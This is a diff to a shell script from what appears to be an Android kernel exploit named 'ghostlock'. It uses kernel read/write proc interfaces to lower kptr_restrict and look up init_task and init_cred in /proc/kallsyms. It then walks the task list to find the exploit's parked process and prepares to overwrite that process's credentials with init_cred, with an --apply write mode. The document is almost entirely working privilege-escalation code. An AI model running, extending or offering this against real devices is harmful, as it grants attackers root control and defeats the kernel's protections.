@@ -45,17 +45,6 @@ GL_LOG=${GL_LOG:-/data/local/tmp/gl-w1/w1c-self.log}
 T=${1:-}
 IC=${2:-}
 
-if [ -z "$T" ] || [ -z "$IC" ]; then
-    if [ -r "$GL_LOG" ]; then
-        T=$(grep -a 'self task=0x' "$GL_LOG" | tail -1 | sed 's/.*self task=0x//' | cut -c1-16)
-        IC=$(grep -a 'init_cred image=' "$GL_LOG" | tail -1 | sed 's/.*alias=0x//' | cut -c1-16)
-    fi
-fi
-if [ -z "$T" ] || [ -z "$IC" ]; then
-    echo "usage: $0 [--apply] <task_addr_hex> <init_cred_addr_hex>"
-    echo "       (or set GL_LOG to a log containing 'self task=0x..' and 'init_cred image=.. alias=0x..')"
-    exit 2
-fi
 if [ ! -r /proc/kread ] || [ ! -w /proc/kwrite ]; then
     echo "kread_min is not loaded: /proc/kread and /proc/kwrite must exist"
     exit 2
@@ -63,9 +52,6 @@ fi
 
 T=${T#0x}
 IC=${IC#0x}
-echo "task      = 0x$T"
-echo "init_cred = 0x$IC"
-[ "$APPLY" = 1 ] && echo "mode      = APPLY (writes)" || echo "mode      = dry run (no writes; pass --apply)"
 
 # ---------------------------------------------------------------- helpers ----
 # addoff <64bit-hex> <decimal offset> -> 64bit hex (split so no 64-bit math in sh)
@@ -117,6 +103,91 @@ hexok() { # hexok <string> -> true when it is exactly 16 lowercase hex digits
     case "$1" in *[!0-9a-f]*) return 1 ;; esac
     return 0
 }
+
+# ------------------------------------------------------------ locate task ----
+# suboff <64bit-hex> <decimal offset> -> 64bit hex
+suboff() {
+    hi=${1%????????}
+    lo=${1#$hi}
+    n=$((0x$lo - $2))
+    if [ "$n" -lt 0 ]; then
+        n=$((n + 4294967296))
+        hi=$(printf '%08x' $((0x$hi - 1)))
+    fi
+    printf '%s%08x' "$hi" "$n"
+}
+
+# kptr_restrict is 2 on this handset, so /proc/kallsyms is zeroed for everyone --
+# but root may lower it, so do that for the lookup and put it back on exit.
+KPTR_SAVE=
+kptr_restore() {
+    if [ -n "$KPTR_SAVE" ] && [ "$KPTR_SAVE" != 0 ]; then
+        echo "$KPTR_SAVE" > /proc/sys/kernel/kptr_restrict 2>/dev/null
+    fi
+    return 0
+}
+trap kptr_restore EXIT INT TERM HUP
+
+sym() { # sym <name> -> address from /proc/kallsyms
+    awk -v n="$1" '$3 == n { print $1; exit }' /proc/kallsyms
+}
+
+kr_ascii() { # kr_ascii <addr-hex> <len> -> printable column, pipes stripped
+    echo "0x$1 $2" > /proc/kread
+    cat /proc/kread | awk '
+        /^[0-9a-f]+  / {
+            for (i = 2; i <= NF; i++)
+                if (substr($i, 1, 1) == "|") { print $i; exit }
+        }' | tr -d '|'
+}
+
+# walk init_task.tasks (offset 0x4d0) for the parked process: comm is set to
+# "ghostlock" by the exploit, and pid lives at task+0x5d8
+find_parked_task() {
+    head=$(addoff "$1" 0x4d0)
+    p=$(kr "$head" 8)
+    i=0
+    while [ -n "$p" ] && [ "$p" != "$head" ] && [ "$i" -lt 8192 ]; do
+        t=$(suboff "$p" 0x4d0)
+        comm=$(kr_ascii "$(addoff "$t" 0x7a8)" 16)
+        case "$comm" in
+            ghostlock*) echo "$t"; return 0 ;;
+        esac
+        p=$(kr "$p" 8)
+        i=$((i + 1))
+    done
+    return 1
+}
+
+if [ -z "$T" ] || [ -z "$IC" ]; then
+    KPTR_SAVE=$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)
+    if [ -n "$KPTR_SAVE" ] && [ "$KPTR_SAVE" != 0 ]; then
+        if echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null; then
+            echo "kptr_restrict: $KPTR_SAVE -> 0 (restored on exit)"
+        fi
+    fi
+    it=$(sym init_task)
+    [ -n "$IC" ] || IC=$(sym init_cred)
+    if [ -z "$T" ] && [ -n "$it" ]; then
+        T=$(find_parked_task "$it")
+    fi
+fi
+if [ -z "$T" ] || [ -z "$IC" ]; then
+    if [ -r "$GL_LOG" ]; then
+        [ -n "$T" ] || T=$(grep -a 'self task=0x' "$GL_LOG" | tail -1 | sed 's/.*self task=0x//' | cut -c1-16)
+        [ -n "$IC" ] || IC=$(grep -a 'init_cred image=' "$GL_LOG" | tail -1 | sed 's/.*alias=0x//' | cut -c1-16)
+    fi
+fi
+if [ -z "$T" ] || [ -z "$IC" ]; then
+    echo "could not locate the parked task / init_cred (GL_LOG=$GL_LOG)"
+    echo "usage: $0 [--apply] <task_addr_hex> <init_cred_addr_hex>"
+    exit 2
+fi
+T=${T#0x}
+IC=${IC#0x}
+echo "task      = 0x$T   comm=$(kr_ascii "$(addoff "$T" 0x7a8)" 16)"
+echo "init_cred = 0x$IC"
+[ "$APPLY" = 1 ] && echo "mode      = APPLY (writes)" || echo "mode      = dry run (no writes; pass --apply)"
 
 # ------------------------------------------------------------------- read ----
 RC_SAVE=$(kr "$(addoff "$T" 0x790)" 8)
